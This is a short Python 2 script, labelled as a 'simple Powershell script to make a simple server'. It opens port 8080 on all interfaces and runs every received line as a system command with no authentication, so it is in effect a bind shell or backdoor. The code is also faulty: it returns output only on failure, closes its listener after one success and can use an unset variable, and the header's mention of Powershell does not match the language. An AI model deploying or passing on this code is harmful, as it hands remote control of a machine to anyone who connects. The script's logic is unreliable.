#!/usr/bin/python
#=========================================================================================
# Ronald Wochner 
# 17 May 2017
# Version 1
# Simple Powershell script to Make a simple server
#=========================================================================================

import socket, select, os, subprocess

# Create a socket and then bind the socket to all addresses on port 8080
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('',8080))
# Listen for up to 10 incoming connections
print("\n\nListening for new connections...\n")
s.listen(10)
input = [s]

while 1:
    # Check for sockets waiting read
    reader,output,exceptions = select.select(input,[],[])
    for sock in reader:
        # If the socket is our listener, accept a new connection
        if sock ==s:
            c,addr = s.accept()
            print 'New connection from ',addr
            input.append(c)
        # otherwise, it's a command to execute
        else:
            command = sock.recv(1024)
        if command:
            shell=command.rstrip().split(" ")
            try: 
                out = subprocess.Popen(shell,stdout=subprocess.PIPE).communicate()[0]
            except:
                out = "Command failed\n"
                sock.send(out)
            else:
                sock.close() 
                input.remove(sock)
                s.close()
